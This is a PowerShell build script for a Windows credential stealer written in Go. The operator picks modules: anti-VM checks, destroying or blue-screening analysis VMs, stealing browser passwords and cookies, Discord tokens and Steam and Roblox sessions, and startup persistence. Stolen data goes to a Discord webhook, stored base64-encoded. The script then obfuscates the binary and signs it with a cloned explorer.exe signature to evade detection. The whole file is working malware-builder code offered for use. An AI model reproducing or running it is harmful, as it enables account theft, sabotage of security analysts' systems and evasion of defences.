function Check-BinaryExists
{
    param ([string]$binary)
    $null -ne (Get-Command $binary -ErrorAction SilentlyContinue)
}

if (-not (Check-BinaryExists -binary "go"))
{
    Write-Host "Go is required to build this software, but it is not installed."

    # Check if winget is available
    if (Check-BinaryExists -binary "winget")
    {
        $choice = Read-Host "WinGet is available. Do you want to automatically install Go? (Y/N)"
        if ($choice -match "^[Yy]$")
        {
            Write-Host "Installing Go via WinGet..."
            Start-Process -FilePath winget -ArgumentList 'install -e --id GoLang.Go --silent --accept-package-agreements --accept-source-agreements' -NoNewWindow -Wait
            Write-Host "Go installation finished. Please restart the script and run this script again."
            exit 0
        } else {
            Write-Host "Please install Go manually from https://go.dev/dl/"
            exit 1
        }
    } else {
        Write-Host "Winget not found. Please install Go manually from https://go.dev/dl/"
        exit 1
    }
}

# Check if a C++ compiler is installed (for CGO).
if (-not (Check-BinaryExists -binary "gcc"))
{
    Write-Host "GCC (MinGW) is required to build this software with CGO support, but it is not installed."
    $choice = Read-Host "This script can automatically install it if you want. Proceed? (Y/N)"
    if ($choice -match "^[Yy]$")
    {
        Write-Host "Installing MSYS2 and GCC..."
        Write-Host "This will download and install MSYS2, which may take some time."

        # Download MSYS2 installer
        Invoke-WebRequest -Uri "https://github.com/msys2/msys2-installer/releases/download/nightly-x86_64/msys2-x86_64-latest.exe" -OutFile "msys2.exe"

        # Install silently (adjust path as needed)
        Write-Host "Starting MSYS2 installation..."
        Start-Process msys2.exe -ArgumentList "install -c --al --am -t C:\msys64" -NoNewWindow -Wait
        Remove-Item msys2.exe
        Write-Host "MSYS2 installation completed."

        Write-Host "Updating MSYS2 and installing GCC... Please wait, this should be fast."
        Start-Process -FilePath "C:\msys64\usr\bin\bash.exe" -ArgumentList "-lc 'pacman -Syu --noconfirm mingw-w64-x86_64-gcc'" -NoNewWindow -Wait

        # Update PATH to include MSYS2 binaries
        if (-not ($env:PATH -like "*C:\msys64\mingw64\bin*"))
        {
            [System.Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";C:\msys64\mingw64\bin;C:\msys64\usr\bin", [System.EnvironmentVariableTarget]::User)
        }

        Write-Host "GCC installation finished. Please restart the script and run this script again."
        exit 0
    }
}

if (-not (Check-BinaryExists -binary "git"))
{
    Write-Host "Git is required to build this software, but it is not installed. Installing Git via MSYS2..."
    Start-Process -FilePath "C:\msys64\usr\bin\bash.exe" -ArgumentList "-lc 'pacman -S --noconfirm git'" -NoNewWindow -Wait
    Write-Host "Git installation finished."
}

# Navigate to the script's directory
Set-Location -Path $PSScriptRoot

# Ensure Go modules are up to date
Write-Host "Updating Go modules..."
Start-Process -FilePath go -ArgumentList "mod", "tidy" -NoNewWindow -Wait
Write-Host "Go modules updated."
Write-Host ""

Start-Process -FilePath go -ArgumentList "install", "github.com/CuteTenshii/go-obfuscator@latest" -NoNewWindow -Wait

# Prompt for filename
$filename = Read-Host "Enter the output filename (without extension)"
if ([string]::IsNullOrWhiteSpace($filename))
{
    Write-Host "Filename cannot be empty."
    exit 1
}

function Ask-YesNo
{
    param ([string]$question)
    while ($true)
    {
        $response = Read-Host "$question (Y/N)"
        if ($response -match "^[Yy]$")
        {
            return $true
        }
        elseif ($response -match "^[Nn]$")
        {
            return $false
        }
        else
        {
            Write-Host "Please enter Y or N."
        }
    }
}

$goTags = ""
$discordWebhook = ""
if (Ask-YesNo "Check if the user is running in a Virtual Machine or sandbox?")
{
    $goTags += "antivm "
}
if ($goTags -Contains "antivm")
{
    if (Ask-YesNo "If the user is in a VM, make the VM unbootable?")
    {
        $goTags += "vmdestroy "
    }
    if (Ask-YesNo "If the user is in a VM, crash their system with a BSOD?")
    {
        $goTags += "bsod "
    }
}
if (Ask-YesNo "Grab browsers data (cookies, history, passwords)?")
{
    $goTags += "browsers "
}
if (Ask-YesNo "Grab Discord tokens?")
{
    $goTags += "discord "
}
if (Ask-YesNo "Grab Steam sessions?")
{
    $goTags += "steam "
}
if (Ask-YesNo "Grab Roblox sessions?")
{
    $goTags += "roblox "
}
if (Ask-YesNo "Add the executable to Windows startup?")
{
    $goTags += "startup "
}
if ($goTags -eq "")
{
    Write-Host ""
    Write-Host "No modules selected. What do you expect the stealer to do then?"
    Write-Host ""
    exit 1
}
$discordWebhook = Read-Host "Enter your Discord webhook URL"
if ([string]::IsNullOrWhiteSpace($discordWebhook))
{
    Write-Host "No webhook provided."
    exit 1
}

$goTags = $goTags.Trim()
$output = "$filename.exe"
$env:GOOS = "windows"
$env:GOARCH = "amd64"
$env:CGO_ENABLED = "1"

Write-Host ""

function Encode-Base64
{
    param ([string]$plainText)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
    return [Convert]::ToBase64String($bytes)
}

Write-Host "Downloading GoSigThief..."
Invoke-WebRequest -Uri "https://github.com/CuteTenshii/GoSigThief/releases/download/release/GoSifThief.exe" -OutFile "GoSigThief.exe"
Write-Host "GoSigThief downloaded."
Write-Host ""


# Build the project
Write-Host "Building your executable... This may be fast or take a while depending on your system."
$encodedWebhook = Encode-Base64 -plainText $discordWebhook
$ldflags = "-X \`"main.modulesEnabled=$goTags\`" -X \`"main.discordWebhookUrl=$encodedWebhook\`" -s -w -H=windowsgui"
$buildArgs = @(
    "-input", "."
    "-trimpath"
    "-ldflags", "`"$ldflags`""
    "-o", $output
)
$build = Start-Process -FilePath go-obfuscator -ArgumentList $buildArgs -NoNewWindow -Wait -PassThru

if ($build.ExitCode -ne 0)
{
    Write-Host "Build failed."
    exit 1
}

Write-Host "Build succeeded."
Write-Host ""

Write-Host "Signing the executable with GoSigThief..."
.\GoSigThief.exe -a -i "$output" -o "output.exe" -c "C:\Windows\explorer.exe"

Write-Host "Executable signed."
Write-Host ""